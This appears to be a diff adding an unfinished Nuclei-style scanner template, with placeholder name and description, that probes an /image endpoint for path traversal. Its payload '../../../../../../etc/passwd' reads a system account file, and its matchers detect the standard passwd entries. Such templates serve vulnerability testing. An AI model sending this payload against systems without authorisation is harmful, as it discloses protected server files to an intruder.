@@ -1,0 +1,68 @@
+id: template-id
+
+info:
+  name: Template Name
+  author: chitowebster
+  severity: medium
+  description: description
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - raw:
+      - |+
+        GET /image?filename={{param}} HTTP/2
+        Host: {{Hostname}}
+        
+
+    attack: batteringram
+    payloads:
+      param:
+        - ../../../../../../etc/passwd
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "root:x:0:0"
+          - "daemon:x:1:1"
+          - "bin:x:2:2"
+          - "sys:x:3:3"
+          - "sync:x:4:65534"
+          - "games:x:5:60"
+          - "man:x:6:12"
+          - "lp:x:7:7"
+          - "mail:x:8:8"
+          - "news:x:9:9"
+          - "uucp:x:10:10"
+          - "proxy:x:13:13"
+          - "www-data:x:33:33"
+          - "backup:x:34:34"
+          - "list:x:38:38"
+          - "irc:x:39:39"
+          - "gnats:x:41:41"
+          - "nobody:x:65534:65534"
+
+    matchers:
+      - type: word
+        words:
+          - "root:x:0:0"
+          - "daemon:x:1:1"
+          - "bin:x:2:2"
+          - "sys:x:3:3"
+          - "sync:x:4:65534"
+          - "games:x:5:60"
+          - "man:x:6:12"
+          - "lp:x:7:7"
+          - "mail:x:8:8"
+          - "news:x:9:9"
+          - "uucp:x:10:10"
+          - "proxy:x:13:13"
+          - "www-data:x:33:33"
+          - "backup:x:34:34"
+          - "list:x:38:38"
+          - "irc:x:39:39"
+          - "gnats:x:41:41"
+          - "nobody:x:65534:65534"
+        part: all
